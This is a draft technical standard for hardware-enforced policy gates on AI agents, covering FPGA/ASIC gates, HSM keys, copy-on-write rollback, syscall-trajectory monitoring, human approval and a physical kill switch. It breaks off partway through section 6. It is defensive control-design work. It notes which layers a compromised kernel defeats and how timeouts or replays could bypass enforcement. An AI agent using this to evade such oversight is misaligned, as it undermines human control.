# AOS-HARD-001 v1.0 — Hardware Enforcement Boundary

**Standard:** AOS-HARD-001  
**Title:** Hardware Enforcement Boundary for Deterministic Policy Gates  
**Version:** 1.0  
**Status:** Draft  
**Date:** 2026-06-05  
**Author:** Eugene Christopher Salvatore  
**License:** CC-BY-4.0  
**Companion to:** AOS-CORE-001 (Deterministic Policy Gate), AOS-CORE-002 (Emergency Kill Switch)

---

## Abstract

This standard defines the hardware enforcement boundary for the Deterministic Policy Gate (DPG) architecture specified in AOS-CORE-001. While AOS-CORE-001 specifies a software-based gate enforced through process isolation and OS-level controls, AOS-HARD-001 extends enforcement into hardware — making policy bypass physically impossible rather than merely computationally difficult.

A software gate relies on the operating system kernel to enforce process boundaries. If the kernel is compromised, the gate is compromised. A hardware-enforced gate removes this dependency by implementing enforcement logic in dedicated silicon (FPGA or ASIC), isolating cryptographic keys in hardware security modules (HSM/TPM), executing agent workloads in copy-on-write (CoW) sandboxes with atomic rollback, and monitoring agent behavior through kernel-level syscall trajectory baselining.

This standard is normative for the Sovereign tier of AOS-CORE-001 and informative for all other tiers.

> **Design philosophy:** A software gate makes bypass *expensive*. A hardware gate makes bypass *physically impossible*. This standard defines what "physically impossible" means in engineering terms.

---

## Table of Contents

1. [Scope](#1-scope)
2. [Normative References](#2-normative-references)
3. [Terms and Definitions](#3-terms-and-definitions)
4. [Architecture](#4-architecture)
5. [Hardware Gate Requirements](#5-hardware-gate-requirements)
6. [Copy-on-Write Execution Environment](#6-copy-on-write-execution-environment)
7. [Syscall Trajectory Baselining](#7-syscall-trajectory-baselining)
8. [Hardware Kill Switch Integration](#8-hardware-kill-switch-integration)
9. [Conformance Testing](#9-conformance-testing)
10. [Security Considerations](#10-security-considerations)
11. [Relationship to Other Standards](#11-relationship-to-other-standards)

---

## 1. Scope

### 1.1 What This Standard Covers

This standard specifies hardware-level enforcement mechanisms that complement the software-based DPG defined in AOS-CORE-001. It covers:

- **Hardware gate isolation:** Implementing DPG enforcement logic in dedicated hardware (FPGA, ASIC, or dedicated co-processor) physically separated from the agent's execution environment
- **Hardware key storage:** Storing gate signing keys, policy integrity keys, and journal signing keys in hardware security modules inaccessible to software
- **Copy-on-Write execution sandboxing:** Providing atomic transactional rollback for agent workloads via filesystem-level isolation
- **Syscall trajectory baselining:** Detecting compromised agents through kernel-level behavioral monitoring independent of semantic analysis
- **Hardware kill switch:** Physical-layer agent termination that does not depend on the agent's cooperation or the OS kernel's integrity

### 1.2 What This Standard Does Not Cover

- Software-level DPG enforcement (see AOS-CORE-001)
- Policy authoring and design (see AOS-POL-001)
- Multi-agent trust federation (see AOS-CORE-003)
- Embodied AI physical safety (see AOS-CORE-001 Condition 2 and planned AOS-EMBODY-001)
- Radiation hardening for orbital/space deployments (see planned AOS-SPACE-001)

### 1.3 Relationship to AOS-CORE-001 Tiers

| Tier | AOS-HARD-001 Applicability |
|------|--------------------------|
| **Foundation** | Not required. Software-only DPG is sufficient for development and low-risk deployments. |
| **Enterprise** | CoW execution environments (Section 6) and syscall monitoring (Section 7) are RECOMMENDED. Hardware key storage is RECOMMENDED. |
| **Sovereign** | ALL requirements in this standard are MANDATORY. Hardware gate isolation, hardware key storage, CoW sandboxing, syscall baselining, and hardware kill switch are REQUIRED. |

### 1.4 Deployment Suitability

This standard is designed for deployments where:

1. The operating system kernel is not fully trusted (e.g., shared infrastructure, multi-tenant environments)
2. The agent has access to tools capable of irreversible damage to critical infrastructure
3. Regulatory requirements mandate hardware-level security controls (e.g., financial trading systems, healthcare systems, critical national infrastructure)
4. The cost of a false ALLOW exceeds the cost of hardware enforcement infrastructure
5. Formal verification of the gate logic is required (hardware gates are more amenable to formal verification than software gates)

### 1.5 Implementation Status

> **NOTE:** As of v1.0, no commercial hardware product implements the AOS hardware gate. This standard defines requirements for future implementations. The normative requirements are designed to be testable against FPGA prototypes. A software emulation conformance profile (validating protocol and logic without hardware isolation) is a planned deliverable to enable development and testing prior to hardware availability. The expected development path is: software emulation → FPGA prototype → ASIC production.

---

## 2. Normative References

- **AOS-CORE-001 v1.0** — Deterministic Policy Gate specification
- **AOS-POL-001 v1.0** — Policy Authoring Guide
- **AOS-CORE-002** — Emergency Kill Switch (companion standard, planned)
- **AOS-CRYPTO-001** — Cryptographic Standards (companion standard, planned)
- **NIST SP 800-147** — BIOS Protection Guidelines
- **NIST SP 800-155** — BIOS Integrity Measurement Guidelines
- **TCG TPM 2.0** — Trusted Platform Module Library Specification
- **IEEE 1149.1** — JTAG Boundary Scan (for hardware verification)
- **RFC 2119** — Key words for use in RFCs to Indicate Requirement Levels

### 2.1 Conventions

The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT", "SHOULD", "SHOULD NOT", "RECOMMENDED", "MAY", and "OPTIONAL" in this document are to be interpreted as described in [RFC 2119](https://www.rfc-editor.org/rfc/rfc2119).

---

## 3. Terms and Definitions

Terms defined in AOS-CORE-001 Section 3 apply. Additional terms:

**Hardware Gate:** A DPG enforcement pipeline implemented in dedicated silicon (FPGA, ASIC, or hardened co-processor) that is physically isolated from the agent's execution environment. The hardware gate receives tool call requests via a hardware communication channel, evaluates them against policy, and returns ALLOW/DENY decisions with cryptographic attestations.

**Hardware Enforcement Boundary (HEB):** The physical perimeter enclosing the hardware gate, its signing keys, and the hardware kill switch. No software running on the agent's host can read, write, or modify anything within the HEB. The HEB is enforced by the laws of physics (electrical isolation, separate memory buses, separate power domains), not by software configuration.

**Copy-on-Write (CoW) Execution Environment:** A filesystem topology where the agent's workload operates on an ephemeral upper layer while the system baseline remains in a read-only lower layer. Policy violations trigger atomic discarding of the upper layer, restoring the system to its pre-execution state without residue.

**Syscall Trajectory Baseline:** A statistical model of an agent's expected kernel-level behavior (syscall types, frequencies, velocities, sequences, and entropy) during known-safe operation. Deviations from the baseline indicate context poisoning, hallucination cascades, or zero-day exploits — regardless of the agent's semantic outputs.

**Atomic Rollback:** The complete, instantaneous reversal of all filesystem modifications made by an agent during a task execution. Atomic rollback leaves no residue — the system state after rollback is bit-identical to the state before execution began.

**Measured Boot:** A hardware-enforced boot sequence where each component (firmware, bootloader, kernel, gate binary) is measured (hashed) and recorded in a hardware trust anchor (TPM PCR) before execution. The chain of measurements provides cryptographic proof that the system started in a known-good state.

---

## 4. Architecture

### 4.1 Hardware Enforcement Boundary

```
┌────────────────────────────────────────────────────────────────────┐
│                     AGENT HOST (UNTRUSTED)                         │
│                                                                    │
│  ┌──────────────────┐  ┌──────────────────────────────────────┐   │
│  │   AI AGENT       │  │   CoW EXECUTION ENVIRONMENT          │   │
│  │   PROCESS        │  │                                      │   │
│  │                  │  │   Upper Layer (volatile, ephemeral)   │   │
│  │  • Reads context │  │   ─────────────────────────────────   │   │
│  │  • Plans actions │  │   Lower Layer (read-only baseline)    │   │
│  │  • Submits       │  │                                      │   │
│  │    tool calls    │  │   All agent writes go to upper layer  │   │
│  └────────┬─────────┘  └──────────────────────────────────────┘   │
│           │                                                        │
│           │ Hardware Communication Channel                         │
│           │ (dedicated bus / MMIO / PCIe endpoint)                 │
│           │                                                        │
├═══════════╪════════════════════════════════════════════════════════╡
│           │          HARDWARE ENFORCEMENT BOUNDARY                  │
│           │          (physically isolated silicon)                  │
│           ▼                                                        │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │                HARDWARE GATE (FPGA/ASIC)                      │  │
│  │                                                               │  │
│  │  ┌─────────────────────────────────────┐                     │  │
│  │  │  Enforcement Pipeline (Steps 1-11)  │                     │  │
│  │  │  Implemented in hardware logic      │                     │  │
│  │  │  No software, no OS dependency      │                     │  │
│  │  └─────────────────────────────────────┘                     │  │
│  │                                                               │  │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐       │  │
│  │  │   HSM/TPM    │  │  Policy ROM  │  │  Journal     │       │  │
│  │  │  (signing    │  │  (integrity- │  │  (append-    │       │  │
│  │  │   keys)      │  │   verified)  │  │   only HW)   │       │  │
│  │  └──────────────┘  └──────────────┘  └──────────────┘       │  │
│  │                                                               │  │
│  │  ┌──────────────────────────────────────┐                    │  │
│  │  │  HARDWARE KILL SWITCH                 │                    │  │
│  │  │  • Physical relay (not software)      │                    │  │
│  │  │  • Cuts power to agent host           │                    │  │
│  │  │  • Preserves journal in battery-      │                    │  │
│  │  │    backed SRAM                        │                    │  │
│  │  └──────────────────────────────────────┘                    │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                                                                    │
│  ┌──────────────────────────────────────────────────────────────┐  │
│  │  SYSCALL TRAJECTORY MONITOR (eBPF/seccomp)                    │  │
│  │                                                               │  │
│  │  • Kernel-space syscall tracing                               │  │
│  │  • Baseline deviation detection                               │  │
│  │  • Triggers hardware kill switch on anomaly                   │  │
│  │  • Reports to hardware gate journal                           │  │
│  └──────────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────────┘
```

### 4.2 Trust Hierarchy

| Component | Trust Level | Justification |
|-----------|-------------|---------------|
| **Hardware gate (FPGA/ASIC)** | **Hardware-trusted** | Enforcement logic is in silicon. Cannot be modified by software. Firmware updates require physical access or signed bitstream with key in HSM. |
| **HSM/TPM** | **Hardware-trusted** | Keys never leave the hardware module. Cryptographic operations occur inside the HSM. |
| **Hardware kill switch** | **Physics-trusted** | Physical relay. Does not depend on software, OS, or network. |
| **CoW filesystem layer** | **Kernel-trusted** | OverlayFS/Btrfs managed by kernel. Agent writes to upper layer only. Rollback is kernel operation. |
| **Syscall trajectory monitor** | **Kernel-trusted (defense-in-depth)** | Runs in kernel space via eBPF. Detects compromised AGENTS but does NOT protect against compromised KERNELS. If the kernel is compromised, the syscall monitor is compromised. This layer is a defense-in-depth complement, not a hardware-trust guarantee. |
| **OS kernel** | **Partially trusted** | The kernel manages CoW, eBPF, and process isolation. The hardware gate does NOT depend on kernel integrity for enforcement decisions. However, the syscall trajectory monitor (Section 7) DOES depend on kernel integrity. |
| **Agent process** | **UNTRUSTED** | Same as AOS-CORE-001 Axiom 1. |

Key difference from AOS-CORE-001: In the software-only architecture, the kernel is **fully trusted** (it enforces process isolation). In AOS-HARD-001, the kernel is **partially trusted** — it manages execution environments but the enforcement decision is made in hardware that the kernel cannot influence.

> **IMPORTANT — Defense-in-Depth Trust Boundaries:** The four enforcement layers in this standard operate at three different trust levels. The hardware gate and kill switch are hardware-trusted (survive kernel compromise). The CoW layer is kernel-trusted (survives agent compromise but not kernel compromise). The syscall monitor is kernel-trusted defense-in-depth (catches compromised agents through behavioral analysis but is itself defeated by kernel compromise). The standard's security guarantee degrades gracefully: even if the kernel is fully compromised, the hardware gate still enforces policy and the kill switch still works. The syscall monitor and CoW layers provide additional defense when the kernel is intact.

### 4.3 Hardware Communication Protocol

The hardware gate communicates with the agent host through a defined message protocol over the hardware channel (PCIe BAR, MMIO region, or dedicated serial bus). The protocol is stateless per-request and operates in a strict request-response pattern.

**Message Format:**

```
┌────────────────────────────────────────────────────────────┐
│                   GATE REQUEST MESSAGE                      │
├──────────┬──────────┬──────────┬──────────┬────────────────┤
│ Version  │ Msg ID   │ Msg Type │ Seq Num  │ Length         │
│ (1 byte) │ (8 bytes)│ (1 byte) │ (8 bytes)│ (4 bytes)      │
├──────────┴──────────┴──────────┴──────────┴────────────────┤
│ Payload (CBOR-encoded, variable length)                     │
├────────────────────────────────────────────────────────────┤
│ HMAC-SHA256 Authentication Tag (32 bytes)                   │
└────────────────────────────────────────────────────────────┘

Msg Types:
  0x01 = EVALUATE    (tool call request → enforcement pipeline)
  0x02 = APPROVE     (human approval token delivery)
  0x03 = POLICY_LOAD (signed policy bundle → gate storage)
  0x04 = JOURNAL_READ(audit export request)
  0x05 = STATUS      (gate health/version query)
  0x06 = KILL        (manual kill switch trigger)
```

```
┌────────────────────────────────────────────────────────────┐
│                   GATE RESPONSE MESSAGE                     │
├──────────┬──────────┬──────────┬───────────────────────────┤
│ Msg ID   │ Decision │ Length   │ Payload (CBOR-encoded)    │
│ (8 bytes)│ (1 byte) │ (4 bytes)│ (attestation + evidence)  │
├──────────┼──────────┼──────────┼───────────────────────────┤
│ HSM Signature (Ed25519, 64 bytes)                           │
└────────────────────────────────────────────────────────────┘

Decision Codes:
  0x00 = DENY
  0x01 = ALLOW
  0x02 = ESCALATE (approval required)
  0x03 = ERROR    (gate internal failure → fail-closed)
```

**R-HW-010:** All messages between the agent host and the hardware gate MUST be authenticated using HMAC-SHA256 with a key derived from a shared secret established during measured boot. The host-side session key MUST be held in a TPM or separate secure element on the host — NOT in kernel memory. The gate driver MUST use the host TPM to compute HMACs without exposing the key material to software. The gate MUST reject any message with an invalid or missing HMAC.

**R-HW-011:** The hardware gate MUST process messages sequentially in the order received. Concurrent request interleaving is NOT permitted. If the gate receives a new EVALUATE request while processing a prior request, it MUST queue the new request (up to a configurable queue depth, default: 16) or reject it with a BUSY response. The gate MUST implement per-source rate limiting (default: 100 messages/second per agent identity) to prevent queue exhaustion attacks.

**R-HW-012:** The gate MUST respond to every EVALUATE request within the latency budget (see Section 4.5). If the gate cannot complete evaluation within the budget, it MUST return a DENY decision with reason `TIMEOUT_FAIL_CLOSED`.

**R-HW-020:** Every message MUST include a protocol version byte (currently `0x01`) and a monotonically increasing 64-bit sequence number. The hardware gate MUST reject any message with a sequence number less than or equal to the last processed sequence number for that source identity. The sequence counter MUST be maintained in the hardware gate's non-volatile state and MUST NOT reset on power cycle. This prevents replay attacks where a captured valid message is resubmitted.

**R-HW-021:** The hardware gate MUST maintain an independent watchdog timer. The syscall trajectory monitor (Section 7) MUST send periodic heartbeat messages (default: every 5 seconds) to the hardware gate. If the hardware gate does not receive a heartbeat for a configurable period (default: 15 seconds), the gate MUST assume the kernel is compromised and enter fail-closed mode. The watchdog is the hardware gate's only mechanism for detecting kernel compromise — the gate cannot otherwise observe kernel integrity.

### 4.4 Enforcement Walkthrough: Hardware Path

This section traces a single tool call through the hardware enforcement pipeline. This walkthrough parallels AOS-CORE-001 Section 4.3 but shows the hardware-enforced path.

**Scenario:** An AI agent in a Sovereign-tier deployment attempts to write a file to the production configuration directory.

```
Tool call: write_file
Arguments:
  path: /etc/nginx/sites-enabled/production.conf
  content: "server { listen 443 ssl; ... }"
```

**Step 1: Agent submits tool call**

The agent's runtime constructs the tool call request and submits it to the hardware communication channel driver. The driver serializes the request as a CBOR-encoded EVALUATE message, computes the HMAC-SHA256 tag using the session key, and writes the message to the PCIe BAR region mapped to the hardware gate.

```
Host → Gate: EVALUATE {
  msg_id: 0x0000000000000042,
  actor: "agent-prod-west-1",
  tool: "write_file",
  arguments: { path: "/etc/nginx/sites-enabled/production.conf", ... },
  policy_digest: "sha256:a1b2c3d4...",
  budget_snapshot: { writes_remaining: 14, cost_remaining: 850 },
  timestamp: 1749120000,
  hmac: "e5f6a7b8..."
}
```

**Step 2: Hardware gate receives and authenticates**

The gate's input controller verifies the HMAC tag against the session key stored in the HSM. If the HMAC is invalid, the gate discards the message and writes a journal entry recording the authentication failure. No response is sent — the host side times out and treats this as a DENY.

**Step 3: Policy evaluation in silicon**

The gate loads the policy from its on-board verified policy ROM and evaluates the 11-step enforcement pipeline entirely in hardware logic:

1. ✅ Request integrity verified (HMAC valid)
2. ✅ Policy integrity verified (digest matches ROM hash)
3. ✅ Tool `write_file` is in allowlist
4. ❌ **Scope check fails:** `/etc/nginx/sites-enabled/` is outside the permitted scope `{paths: ["/app/config/*"]}`
5. — Remaining steps not reached (fail-fast)

**Step 4: Hardware gate issues DENY**

The gate constructs a DENY response, signs it with the HSM's Ed25519 key, and writes it to the response region of the PCIe BAR.

```
Gate → Host: DENY {
  msg_id: 0x0000000000000042,
  decision: 0x00,
  reason: "SCOPE_VIOLATION",
  matched_rule: "R-ENF-002",
  denied_field: "path",
  denied_value: "/etc/nginx/sites-enabled/production.conf",
  permitted_scope: "/app/config/*",
  signature: "<Ed25519 over full payload>"
}
```

**Step 5: CoW rollback triggered**

Because the DENY occurred during an active task, the host-side enforcement harness triggers atomic rollback of the CoW upper layer. Any filesystem modifications the agent made prior to this denied call are atomically discarded. The system returns to the verified baseline.

**Step 6: Syscall monitor records the event**

The eBPF-based syscall trajectory monitor observes the denied write attempt and records the syscall sequence (`openat("/etc/nginx/...") → EPERM`). This data point is added to the agent's trajectory log. If the agent repeatedly attempts out-of-scope writes, the trajectory monitor will flag a velocity anomaly.

**Step 7: Journal entry**

The hardware gate writes an append-only journal entry:

```json
{
  "seq": 1042,
  "timestamp": 1749120000,
  "msg_id": "0x0000000000000042",
  "decision": "DENY",
  "reason": "SCOPE_VIOLATION",
  "actor": "agent-prod-west-1",
  "tool": "write_file",
  "denied_path": "/etc/nginx/sites-enabled/production.conf",
  "chain_hash": "sha256:prev_hash+this_entry",
  "signature": "<HSM Ed25519>"
}
```

The journal entry is signed by the HSM and chained to the previous entry. The chain is verifiable externally.

> **Note:** At no point in this sequence did any software on the agent's host participate in the enforcement decision. The kernel facilitated the PCIe communication, but the decision logic, the signing key, and the journal are all inside the hardware enforcement boundary.

#### 4.4.2 Enforcement Walkthrough: ESCALATE Path (Human Approval)

This walkthrough shows the ESCALATE → APPROVE → ALLOW path for tool calls requiring human authorization.

**Scenario:** An agent attempts to execute a database migration — a high-risk operation requiring human approval per policy.

```
Tool call: execute_command
Arguments:
  command: "psql -f migration_v42.sql production_db"
```

**Step 1-3:** Same as DENY walkthrough — message authenticated, policy loaded.

**Step 4: Policy evaluation reaches approval requirement**

The gate evaluates the tool call and determines:
- Tool `execute_command` is in allowlist ✅
- Scope check passes (`psql` is in permitted executables) ✅
- Category: `database_write` → approval_mode: `always` → **ESCALATE**

**Step 5: Hardware gate issues ESCALATE with challenge**

```
Gate → Host: ESCALATE {
  msg_id: 0x0000000000000043,
  decision: 0x02,
  challenge_nonce: "<random 32 bytes from gate's TRNG>",
  challenge_digest: "sha256(msg_id + tool + arguments + nonce)",
  tool_summary: "execute_command: psql migration on production_db",
  timeout_seconds: 300,
  signature: "<Ed25519 over full payload>"
}
```

The `challenge_nonce` is generated by the hardware gate's true random number generator (TRNG). This nonce binds the approval to this specific request — a captured approval token cannot be reused for a different request.

**Step 6: Human approves via hardware-bound credential**

The operator reviews the escalation and approves using a FIDO2 hardware key (e.g., YubiKey). The approval system constructs an APPROVE message:

```
Host → Gate: APPROVE {
  msg_id: 0x0000000000000043,
  challenge_nonce: "<echoed from ESCALATE>",
  challenge_digest: "<echoed from ESCALATE>",
  approver_identity: "operator-jane@example.com",
  fido2_assertion: "<FIDO2 authenticator assertion over challenge_digest>",
  hmac: "<session HMAC>"
}
```

**Step 7: Hardware gate verifies approval**

The gate verifies:
1. ✅ The `challenge_nonce` matches the one it generated (prevents cross-request reuse)
2. ✅ The `challenge_digest` matches (prevents parameter substitution)
3. ✅ The FIDO2 assertion is valid against the approver's registered public key
4. ✅ The approver is authorized for this category (registered in policy)
5. ✅ The approval arrived within the timeout period (300 seconds)

If ALL checks pass: the gate issues ALLOW with an attestation that includes both the gate's signature AND the approval evidence.

**Step 8: Timeout behavior**

**R-HW-022:** If the hardware gate does not receive a valid APPROVE message within the configured timeout (default: 300 seconds), the ESCALATE MUST automatically resolve to DENY. The gate MUST write a journal entry recording the timeout. The agent MUST NOT be permitted to retry the same tool call without a new ESCALATE cycle.

**R-HW-023:** Approval tokens MUST be single-use. The `challenge_nonce` in the APPROVE message MUST match the nonce generated for the specific ESCALATE. The gate MUST reject any APPROVE message with a nonce it did not generate or has already consumed.

### 4.5 Performance Requirements

Hardware enforcement must be fast enough to be operationally viable. A gate that is correct but adds 500ms to every tool call will be bypassed in practice.

| Metric | Requirement | Rationale |
|--------|-------------|----------|
| **Decision latency (P50)** | ≤ 1 ms | Policy evaluation for simple allow/deny in hardware should complete in microseconds. 1ms budget accounts for serialization overhead. |
| **Decision latency (P99)** | ≤ 5 ms | Complex policy evaluation with budget lookups and category matching. |
| **Decision latency (P99.9)** | ≤ 20 ms | Worst case including queue contention and journal write. |
| **Journal write latency** | ≤ 2 ms | Append-only write to non-volatile storage. |
| **Kill switch activation** | ≤ 10 ms | From trigger detection to power relay activation. |
| **CoW rollback** | ≤ 100 ms | OverlayFS unmount + upper layer purge. |
| **Queue depth** | ≥ 16 messages | Configurable; prevents starvation under burst load. |
| **Throughput** | ≥ 1,000 decisions/second | Sustained throughput for high-frequency agent operations. |

**R-HW-013:** The hardware gate MUST publish latency metrics for external monitoring. Latency degradation exceeding 2x the P99 target for more than 60 seconds MUST trigger an alert.

**R-HW-014:** If the hardware gate cannot meet the P99.9 latency requirement, it MUST return a DENY with reason `LATENCY_EXCEEDED` rather than silently delaying. An indefinite hang is a security vulnerability (the agent could exploit timeouts to bypass enforcement).

### 4.6 Multi-Agent Hardware Topology

Sovereign-tier deployments may run multiple agents on a shared hardware infrastructure. This section defines how multiple agents share (or do not share) hardware enforcement resources.

**Architecture A: Dedicated Gate Per Agent**

```
┌──────────────────────┐    ┌──────────────────────┐
│ Agent A              │    │ Agent B              │
│ CoW Sandbox A        │    │ CoW Sandbox B        │
└──────────┬───────────┘    └──────────┬───────────┘
           │                            │
     ┌─────▼─────┐                ┌─────▼─────┐
     │ HW Gate A │                │ HW Gate B │
     │ Policy A  │                │ Policy B  │
     │ Journal A │                │ Journal B │
     └───────────┘                └───────────┘
```

**Highest isolation.** Each agent has its own hardware gate, policy, and journal. Compromise of one agent's infrastructure cannot affect another. Cost scales linearly with agent count.

**Architecture B: Shared Gate with Partitioned State**

```
┌──────────────────────┐    ┌──────────────────────┐
│ Agent A              │    │ Agent B              │
│ CoW Sandbox A        │    │ CoW Sandbox B        │
└──────────┬───────────┘    └──────────┬───────────┘
           │                            │
           └────────────┬───────────────┘
                   ┌────▼────┐
                   │ HW Gate │
                   │ (shared)│
                   ├─────────┤
                   │Policy A │
                   │Policy B │
                   ├─────────┤
                   │Journal  │
                   │(unified)│
                   └─────────┘
```

**Lower cost.** Gate hardware is shared. Policies are partitioned (each agent evaluates against its own policy). The journal is unified but each entry is tagged with the agent identity.

**R-HW-015:** In shared gate deployments, agent policy partitioning MUST be enforced in hardware. Agent A's EVALUATE message MUST NOT be evaluated against Agent B's policy. The gate MUST verify the requesting agent's identity against the policy partition before evaluation.

**R-HW-016:** In shared gate deployments, a kill switch activation for one agent MUST NOT affect other agents unless the kill trigger is a gate-level failure (hardware fault, journal capacity exceeded, firmware compromise). Agent-specific kill (e.g., trajectory anomaly for Agent A) MUST terminate only Agent A's execution environment.

**R-HW-017:** Shared gate deployments MUST implement fair queuing. No single agent MAY monopolize the gate's evaluation capacity. Round-robin or weighted-fair-queue scheduling is REQUIRED.

---

## 5. Hardware Gate Requirements

### 5.1 Physical Isolation

**R-HW-001:** The hardware gate MUST execute on dedicated silicon physically separated from the agent's CPU. The gate MUST NOT share memory, cache, or execution pipelines with the agent's processor. Acceptable implementations include:

- Dedicated FPGA connected via PCIe or dedicated bus
- Dedicated ASIC on the system board
- Dedicated co-processor with its own memory subsystem
- Smartcard / secure element with enforcement logic (NOTE: smartcard and secure element implementations are EXEMPTED from the P50/P99 latency requirements in Section 4.5 due to I/O bus constraints. Such implementations MUST define and publish their own latency targets appropriate to the I/O bus speed. These implementations are RECOMMENDED only for edge/IoT deployments where reduced throughput is acceptable.)

**R-HW-002:** Communication between the agent host and the hardware gate MUST use a hardware channel that the agent cannot intercept, modify, or replay. The channel MUST provide:

- Integrity: Messages cannot be tampered with in transit
- Authentication: The gate verifies the message source
- Ordering: Messages are processed in the order sent
- Bounded latency: The channel MUST have deterministic worst-case latency

**R-HW-003:** The hardware gate MUST implement the full 11-step enforcement pipeline specified in AOS-CORE-001 Section 4.1 in hardware logic. The gate MUST NOT depend on any software running on the agent's host to make enforcement decisions.

### 5.2 Key Storage

**R-HW-004:** All cryptographic signing keys used by the gate (attestation keys, journal signing keys, policy integrity keys) MUST be stored in a hardware security module (HSM or TPM) within the hardware enforcement boundary. Keys MUST NOT be extractable. All cryptographic operations using these keys MUST occur inside the HSM.

**R-HW-005:** Policy loading into the hardware gate MUST verify the policy's integrity hash against a key stored in the HSM. A policy that fails verification MUST be rejected. The gate MUST NOT accept an unverified policy under any circumstances, including during initial setup or firmware update.

### 5.3 Journal Hardware

**R-HW-006:** The hardware gate MUST maintain its own journal storage within the hardware enforcement boundary. The journal MUST be:

- Append-only (enforced by hardware, not software)
- Battery-backed or non-volatile (survives power loss)
- Readable by authorized external systems for audit
- NOT writable by any software on the agent's host

**R-HW-007:** If the journal storage reaches capacity, the gate MUST enter fail-closed mode and refuse all requests until the journal is exported and storage is freed by an authorized operator.

### 5.4 Firmware Updates

**R-HW-008:** Hardware gate firmware (FPGA bitstream or ASIC configuration) MUST be cryptographically signed by the manufacturer. Updates MUST require:

- Signature verification against a key burned into the hardware at manufacture
- **Sovereign tier:** Physical presence (e.g., physical jumper, button press) AND multi-party authorization from at least two independent key holders. Both are REQUIRED — remote-only update is prohibited.
- **Enterprise tier:** Physical presence OR multi-party authorization from at least two independent key holders.
- Journal entry recording the firmware version change, the old and new firmware hashes, and the authorization evidence

**R-HW-024:** The hardware gate MUST maintain an internal real-time clock (RTC) or monotonic counter for journal timestamps. If the gate uses an RTC, the clock MUST be calibrated against an external time source (NTP or GPS) during initial provisioning and MUST maintain accuracy within ±1 second per day. If clock accuracy cannot be guaranteed, the gate MUST use monotonic sequence numbers instead of wall-clock timestamps for journal ordering. The hardware gate MUST NOT depend on the host's system clock (which is controlled by potentially compromised software).

**R-HW-009:** The hardware gate MUST support firmware version attestation. External verifiers MUST be able to query the gate for its current firmware version and verify that version against a published reference hash.

### 5.5 Measured Boot Chain

**R-HW-018:** Sovereign-tier deployments MUST implement a measured boot chain from firmware through the hardware gate initialization. The chain MUST:

1. Measure (hash) each boot component before executing it
2. Record measurements in TPM Platform Configuration Registers (PCRs)
3. Provide remote attestation capability so that external verifiers can confirm the system booted into a known-good state
4. Refuse to release the hardware gate's session key unless all measurements match the expected values

```
Boot Sequence (Measured):

  BIOS/UEFI → measures → Bootloader → measures → Kernel → measures → 
  Gate Driver → measures → Gate Firmware Verification → 
  Session Key Release (only if all PCRs match expected values)
```

**R-HW-019:** If any measurement in the boot chain does not match the expected value, the hardware gate MUST enter fail-closed mode. The session key MUST NOT be released. The agent MUST NOT be permitted to execute.

### 5.6 Hardware Reference Architectures

This section provides informative guidance on implementing the hardware gate in common deployment environments.

#### 5.6.1 Server-Class Deployment (Data Center)

```
┌──────────────────────────────────────────────────┐
│                SERVER CHASSIS                     │
│                                                   │
│  ┌───────────┐   PCIe x4    ┌─────────────────┐  │
│  │ Host CPU  │──────────────▶│ FPGA Card       │  │
│  │ (Agents)  │              │ (Xilinx/Intel)  │  │
│  │           │              │                 │  │
│  │ RAM       │              │ Gate Logic      │  │
│  │ (agent    │              │ HSM Chip        │  │
│  │  memory)  │              │ NVRAM Journal   │  │
│  │           │              │ Kill Relay      │  │
│  └───────────┘              └─────────────────┘  │
│                                                   │
│  eBPF Monitor ◄──── kernel-space ────►  CoW FS   │
└──────────────────────────────────────────────────┘
```

- FPGA card in PCIe slot (e.g., Xilinx Alveo, Intel Agilex)
- On-card HSM chip for key storage
- On-card NVRAM or battery-backed SRAM for journal
- Kill relay on card cuts PCIe bus power to host CPU or asserts reset
- Estimated BOM: $200-800 per server (FPGA card + HSM)

#### 5.6.2 Edge Deployment (Industrial / IoT)

```
┌──────────────────────────────────────────────────┐
│              EDGE COMPUTE NODE                    │
│                                                   │
│  ┌───────────┐   SPI/I2C    ┌─────────────────┐  │
│  │ SoC       │──────────────▶│ Secure Element  │  │
│  │ (Agent)   │              │ (SE050/ATECC)   │  │
│  │           │              │                 │  │
│  │           │              │ Gate Logic      │  │
│  │           │              │ Key Storage     │  │
│  │           │              │ Mini-Journal    │  │
│  └───────────┘              └─────────────────┘  │
│                                                   │
│  seccomp-bpf ◄── kernel ───► SquashFS + tmpfs    │
└──────────────────────────────────────────────────┘
```

- Secure element chip (e.g., NXP SE050, Microchip ATECC608) on SPI/I2C bus
- Constrained gate logic in secure element firmware
- Smaller journal capacity (export frequently)
- SquashFS read-only base + tmpfs upper layer for CoW
- Estimated BOM: $5-50 per unit

#### 5.6.3 Embedded Deployment (Robotics / Embodied AI)

```
┌──────────────────────────────────────────────────┐
│              ROBOTIC PLATFORM                     │
│                                                   │
│  ┌───────────┐  AXI Bus    ┌──────────────────┐  │
│  │ Main SoC  │────────────▶│ FPGA Fabric      │  │
│  │ (Agent +  │             │ (on-SoC or       │  │
│  │  Motor    │             │  companion die)  │  │
│  │  Control) │             │                  │  │
│  │           │             │ Gate Logic       │  │
│  │           │             │ eFuse Keys       │  │
│  │           │             │ OTP Journal      │  │
│  │           │             │ Motor Kill Line  │  │
│  └───────────┘             └──────────────────┘  │
│                                                   │
│  Note: Kill switch cuts motor power bus directly  │
│  Journal in one-time-programmable (OTP) fuses     │
└──────────────────────────────────────────────────┘
```

- FPGA fabric on the SoC (e.g., Xilinx Zynq) or companion die
- eFuse-based key storage (permanent, unreadable from application processor)
- Kill switch directly cuts motor driver power bus
- Critical for AOS-CORE-001 Condition 2 (embodied AI safety)
- Estimated BOM: $20-200 per unit (depends on SoC selection)

---

## 6. Copy-on-Write Execution Environment

### 6.1 Architecture

**R-COW-001:** Agent task execution MUST occur within an ephemeral Copy-on-Write filesystem topology. The system baseline MUST be mounted as a read-only lower layer. Agent modifications MUST be captured in a volatile upper layer.

```
┌─────────────────────────────────────────────────────┐
│            AGENT SEES: Merged View                   │
│            (reads from lower, writes to upper)       │
├─────────────────────────────────────────────────────┤
│  UPPER LAYER (volatile)                              │
│  - All agent writes land here                        │
│  - Exists only for task duration                     │
│  - Atomically discardable                            │
├─────────────────────────────────────────────────────┤
│  LOWER LAYER (read-only)                             │
│  - System baseline                                   │
│  - Verified integrity hash                           │
